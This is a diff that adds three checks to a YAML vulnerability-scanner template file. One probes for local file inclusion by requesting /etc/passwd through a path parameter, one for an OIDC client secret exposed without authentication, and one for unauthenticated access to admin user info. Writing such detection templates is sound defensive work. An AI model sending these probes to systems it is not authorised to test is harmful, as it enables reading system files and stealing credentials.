@@ -160,3 +160,33 @@
   match:
     status: 200
     body_contains: "ami-id"
+
+- id: lfi-file-raw
+  severity: high
+  title: Local file inclusion via /api/file/raw (reads /etc/passwd)
+  request:
+    method: GET
+    path: "/api/file/raw?path=/etc/passwd"
+  match:
+    status: 200
+    body_contains: "root:x:0:0"
+
+- id: oidc-secret-exposure
+  severity: high
+  title: OIDC client secret exposed without authentication
+  request:
+    method: GET
+    path: "/api/auth/oidc-client"
+  match:
+    status: 200
+    body_contains: "clientSecret"
+
+- id: unauth-userinfo
+  severity: medium
+  title: Unauthenticated access to user info (broken object level auth)
+  request:
+    method: GET
+    path: "/api/v1/userinfo/admin"
+  match:
+    status: 200
+    body_contains: "firstName"
